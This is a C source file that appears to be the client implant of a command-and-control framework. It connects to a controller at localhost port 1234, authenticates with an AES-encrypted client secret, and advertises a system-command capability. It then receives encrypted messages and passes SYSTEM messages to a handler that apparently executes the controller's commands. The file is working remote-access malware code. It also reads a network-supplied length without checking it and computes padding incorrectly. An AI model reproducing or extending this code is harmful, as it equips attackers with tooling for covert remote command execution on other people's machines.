#include <netdb.h>
#include <time.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "aes.h"
#include "capabilities.h"
#include "caps.h"
#include "messages.h"
#include "messaging.h"
#include "util.h"


#ifdef DEBUG
#include <errno.h>
#endif


// This needs to be made non-blocking eventually, but for now here it is
void read_handle_message(int sock, struct AES_ctx* ctx) {

    // Read preamble
    size_t paddded_preamble_size = sizeof(struct tc2_msg_preamble) + (sizeof(struct tc2_msg_preamble) % AES_BLOCKLEN);
    char* preamble_buffer = malloc(paddded_preamble_size);

    read(sock, preamble_buffer, paddded_preamble_size);

    printf("Received preamble\n");
    // TODO: Handle partial reads

    AES_CBC_decrypt_buffer(ctx, (uint8_t*) preamble_buffer, paddded_preamble_size);

    struct tc2_msg_preamble* preamble = (struct tc2_msg_preamble *) preamble_buffer;

    // Read message
    size_t paddded_size = preamble->len + (preamble->len % AES_BLOCKLEN);
    char* message_buffer = malloc(paddded_size);

    read(sock, message_buffer, paddded_size);

    printf("Received message\n");

    AES_CBC_decrypt_buffer(ctx, (uint8_t*) message_buffer, paddded_size);

    if (preamble->type == MSG_SYSTEM) {
        handle_system(message_buffer);

        printf("Executed SYSTEM\n");
    } else {
        printf("Unknown message type %d\n", preamble->type);
    }

    free(message_buffer);
    free(preamble_buffer);
}

// TODO: Dynamically generate this based on compiler flags, adding in capability files as needed
TC2_CAPABILITY_ENUM capabilities[] = { CAP_SYSTEM };
uint32_t NUM_CAPS = 1;

int main(int argc, char* argv[]) {
    srand(time(NULL));
    struct sockaddr_in sockaddr;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(1234);

    struct hostent* hostname = gethostbyname("127.0.0.1");
    sockaddr.sin_addr.s_addr = *((in_addr_t*) hostname->h_addr_list[0]);

    connect(sock, (struct sockaddr *)&sockaddr, sizeof(sockaddr));

    struct tc2_msg_init init_msg;

    // Encrypt ID with key
    struct AES_ctx ctx;

    uint8_t* iv = malloc(16);
    rand_bytes(iv, 16);

    uint8_t key[] = AES_KEY;

    AES_init_ctx_iv(&ctx, key, iv);
    memcpy(init_msg.iv, iv, 16);
    free(iv);

    uint8_t secret[] = CLIENT_SECRET;

    memcpy(init_msg.enc_id, secret, 32);
    AES_CBC_encrypt_buffer(&ctx, init_msg.enc_id, 32);
    

    struct tc2_msg_preamble preamble;
    preamble.type = MSG_INIT;
    preamble.len = sizeof(init_msg);

    write(sock, &preamble, sizeof(preamble));
    write(sock, &init_msg, sizeof(init_msg));

    struct tc2_array cap_arr;
    cap_arr.type = MSG_CAPABILITY;
    cap_arr.num_elements = NUM_CAPS;

    preamble.type = MSG_ARRAY;
    preamble.len = sizeof(cap_arr);

    write_encrypted_padded(sock, &ctx, &preamble, sizeof(preamble));
    write_encrypted_padded(sock, &ctx, &cap_arr, sizeof(cap_arr));

    preamble.type = MSG_CAPABILITY;
    preamble.len = sizeof(struct tc2_capability);

    for (int c=0; c < NUM_CAPS; c++) {
        struct tc2_capability cap;
        cap.add_rem = ADD;
        cap.cap = capabilities[c];

        write_encrypted_padded(sock, &ctx, &preamble, sizeof(preamble));
        write_encrypted_padded(sock, &ctx, &cap, sizeof(cap));
    }

    struct tc2_array_stop arr_stop;
    preamble.type = MSG_ARRAY_STOP;
    preamble.len = sizeof(arr_stop);
    write_encrypted_padded(sock, &ctx, &preamble, sizeof(preamble));
    write_encrypted_padded(sock, &ctx, &arr_stop, sizeof(arr_stop));


    read_handle_message(sock, &ctx);


    char data[16];
    fgets(data, 8, stdin);

    sleep(10);

    close(sock);

    return 0;
}